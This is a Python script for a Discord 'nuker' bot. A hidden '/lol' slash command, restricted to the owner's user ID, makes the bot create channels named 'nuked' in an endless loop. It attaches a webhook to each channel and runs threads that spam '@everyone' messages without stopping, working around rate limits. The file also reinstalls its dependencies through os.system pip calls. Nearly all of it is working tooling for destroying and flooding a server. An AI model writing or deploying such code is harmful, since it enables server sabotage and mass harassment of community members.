import sys
import os
import time
import json
with open("config.json") as data:
    config = json.load(data)
with open("nukerconfig.json") as data:
    nukerconfig = json.load(data)
if config['pyorpython'] == '' or config['path'] == '':
    print("Please edit the config file like so:")
    print('''
{
    "pyorpython":"", -- here put py or python, based on how u run a file py [filename].py or python [filename].py
    "path":"" --here put if u have python to path (y/n)
}''')
    sys.exit()
if nukerconfig['token'] == '' or nukerconfig['userid'] == '':
    print("Please edit the nukerconfig.json file and add your bot's token and ur userid to it!")
    sys.exit()
else:
    token = nukerconfig['token']
    useridlol = nukerconfig['userid']

if config['pyorpython'] == 'py':
    python = False
    py = True
else:
    python = True
    py = False

if config['path'] == 'y':
    path = True
else:
    path = False

if path == True:
    os.system("pip uninstall py-cord -y")
    os.system("pip uninstall py-cord -y")
    os.system("pip uninstall discord.py -y")
    os.system("pip install py-cord")
    os.system("pip install threads")
    os.system("pip install httpx")
else:
    if python:
        os.system("python -m pip uninstall py-cord -y")
        os.system("python -m pip uninstall py-cord -y")
        os.system("python -m pip uninstall discord.py -y")
        os.system("python -m pip install py-cord")
        os.system("python -m pip install threads")
        os.system("python -m pip install httpx")   
    if py:
        os.system("py -m pip uninstall py-cord -y")
        os.system("py -m pip uninstall py-cord -y")
        os.system("py -m pip uninstall discord.py -y")
        os.system("py -m pip install py-cord")
        os.system("py -m pip install threads")
        os.system("py -m pip install httpx")

black = "\033[1;30m"
red = "\033[1;31m"    
green = "\033[1;32m"
yellow = "\033[1;33m"
blue = "\033[1;34m"    
purple = "\033[1;35m"    
cyan = "\033[1;36m"    
white = "\033[1;37m"
os.system("cls")
print(f"""{red}
    
 $$$$$$\            $$\           $$\             
$$  __$$\           \__|          $  |            
$$ /  \__| $$$$$$\  $$\ $$$$$$$\  \_/  $$$$$$$\   
$$ |      $$  __$$\ $$ |$$  __$$\     $$  _____|  
$$ |      $$ /  $$ |$$ |$$ |  $$ |    \$$$$$$\    
$$ |  $$\ $$ |  $$ |$$ |$$ |  $$ |     \____$$\   
\$$$$$$  |\$$$$$$  |$$ |$$ |  $$ |    $$$$$$$  |  
 \______/  \______/ \__|\__|  \__|    \_______/   
$$\   $$\           $$\                           
$$$\  $$ |          $$ |                          
$$$$\ $$ |$$\   $$\ $$ |  $$\  $$$$$$\   $$$$$$\  
$$ $$\$$ |$$ |  $$ |$$ | $$  |$$  __$$\ $$  __$$\ 
$$ \$$$$ |$$ |  $$ |$$$$$$  / $$$$$$$$ |$$ |  \__|
$$ |\$$$ |$$ |  $$ |$$  _$$<  $$   ____|$$ |      
$$ | \$$ |\$$$$$$  |$$ | \$$\ \$$$$$$$\ $$ |      
\__|  \__| \______/ \__|  \__| \_______|\__|      {white}
{blue}/lol to nuke{white}""")

import threading
import httpx
import discord
intents = discord.Intents().all()
bot = discord.Bot(intents=intents)
def spam_webhook(webhook):
    while True:
        try:
            url = webhook.url
            data={"content":"@everyone"}
            r=httpx.post(url,json=data)
            print(r.status_code)
            while r.status_code == 429:
                print("RATE LIMITED, SLEEPING")
                time.sleep(1)
                r=httpx.post(url,json=data)
        except Exception as e:
            print(e)
            pass
def between(webhook):
    threading.Thread(target=spam_webhook,args=(webhook,)).start()
async def forever_send_msg(channel):
    webhook = await channel.create_webhook(name="coin on top")
    #await spam_webhook(webhook=webhook)
    between(webhook)
async def create_channel(guild,name,cat):
    channel = await guild.create_text_channel(str(name),category=cat)
    await forever_send_msg(channel=channel)
async def nuke(guild):
    category = await guild.create_category("nuked")
    await create_channel(guild=guild,name="nuked",cat=category)
async def start_nuke(guild):
    while True:
        await nuke(guild=guild)
@bot.event
async def on_ready():
    print(f"{bot.user} is ready and online!")
@bot.slash_command(name = "lol", description = "Admin Only")
async def nuke_code(ctx):
    global useridlol
    print(useridlol)
    print(f"UserID: {ctx.author.id}")
    if str(ctx.author.id) in str(useridlol):
        guild = ctx.guild
        await ctx.send("starting nuke...")
        await start_nuke(guild=guild)
    else:
        await ctx.send("no perms lol")
bot.run(token)
